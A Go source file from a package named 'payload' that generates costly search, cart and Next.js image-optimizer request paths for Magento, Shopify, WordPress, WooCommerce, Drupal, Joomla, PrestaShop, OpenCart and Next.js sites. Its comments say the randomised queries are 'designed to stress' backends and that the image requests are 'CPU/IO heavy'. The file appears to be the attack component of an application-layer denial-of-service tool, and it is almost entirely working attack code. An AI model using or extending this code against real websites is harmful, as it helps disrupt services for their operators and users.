package payload

import (
	"fmt"
	"net/url"
	"strings"
)

// HeavySearchQuery returns a query string designed to stress catalog/search backends.
func HeavySearchQuery() string {
	switch intN(6) {
	case 0:
		return strings.Repeat(RandString(4)+" ", 40) + "*" + RandString(80)
	case 1:
		return fmt.Sprintf("%s OR %s OR %s", RandString(30), RandString(30), RandString(30))
	case 2:
		return RandString(8) + " " + RandString(8) + " category:" + RandString(20)
	case 3:
		return strings.Repeat("a", 200) + " " + RandString(100)
	case 4:
		return fmt.Sprintf(`"%s"~5`, RandString(25))
	default:
		return RandString(20+intN(180))
	}
}

// MagentoCatalogSearchPath returns a Magento catalog search URL path+query.
func MagentoCatalogSearchPath() string {
	q := url.QueryEscape(HeavySearchQuery())
	switch intN(4) {
	case 0:
		return "/catalogsearch/result/?q=" + q
	case 1:
		return "/catalogsearch/result/index/?q=" + q + "&cat=0"
	case 2:
		desc := url.QueryEscape(HeavySearchQuery())
		return "/catalogsearch/advanced/result/?name=" + q + "&sku=" + q + "&description=" + desc + "&price=0-999999"
	default:
		return "/catalogsearch/result/?q=" + q + "&cat=" + fmt.Sprint(intN(50))
	}
}

// MagentoGuestCartBody returns a minimal guest-cart item JSON body.
func MagentoGuestCartBody() string {
	return fmt.Sprintf(`{"cartItem":{"sku":"%s","qty":%d,"quote_id":"guest"}}`,
		RandString(6+intN(8)), 1+intN(5))
}

// ShopifySearchPath returns a Shopify storefront search path.
func ShopifySearchPath() string {
	q := url.QueryEscape(HeavySearchQuery())
	switch intN(3) {
	case 0:
		return "/search/suggest.json?q=" + q + "&resources[type]=product&resources[limit]=50"
	case 1:
		return "/search?q=" + q + "&type=product"
	default:
		return "/search?q=" + q
	}
}

// DrupalSearchPath returns a Drupal core search path.
func DrupalSearchPath() string {
	return "/search/node?keys=" + url.QueryEscape(HeavySearchQuery())
}

// JoomlaSearchPath returns a Joomla com_search path.
func JoomlaSearchPath() string {
	return "/index.php?option=com_search&searchword=" + url.QueryEscape(HeavySearchQuery())
}

// WordPressSearchPath returns WP front-end or REST search paths.
func WordPressSearchPath() string {
	q := url.QueryEscape(HeavySearchQuery())
	switch intN(3) {
	case 0:
		return "/?s=" + q
	case 1:
		return "/wp-json/wp/v2/posts?search=" + q + "&per_page=100"
	default:
		return "/wp-json/wp/v2/search?search=" + q + "&per_page=100"
	}
}

// WooCommerceSearchPath returns WooCommerce product search paths.
func WooCommerceSearchPath() string {
	q := url.QueryEscape(HeavySearchQuery())
	switch intN(3) {
	case 0:
		return "/?s=" + q + "&post_type=product"
	case 1:
		return "/wp-json/wc/store/products?search=" + q + "&per_page=100"
	default:
		return "/shop/?s=" + q + "&post_type=product"
	}
}

// PrestaShopSearchPath returns PrestaShop search controller path.
func PrestaShopSearchPath() string {
	return "/search?controller=search&s=" + url.QueryEscape(HeavySearchQuery())
}

// OpenCartSearchPath returns OpenCart product search path.
func OpenCartSearchPath() string {
	return "/index.php?route=product/search&search=" + url.QueryEscape(HeavySearchQuery())
}

// NextImageProxyPath returns a Next.js image optimizer path (CPU/IO heavy on origin fetch).
func NextImageProxyPath(baseHost string) string {
	target := url.QueryEscape("https://" + strings.TrimPrefix(strings.TrimPrefix(baseHost, "https://"), "http://") + "/" + RandString(12) + ".jpg")
	w := []int{640, 1080, 1920, 3840}[intN(4)]
	return fmt.Sprintf("/_next/image?url=%s&w=%d&q=75", target, w)
}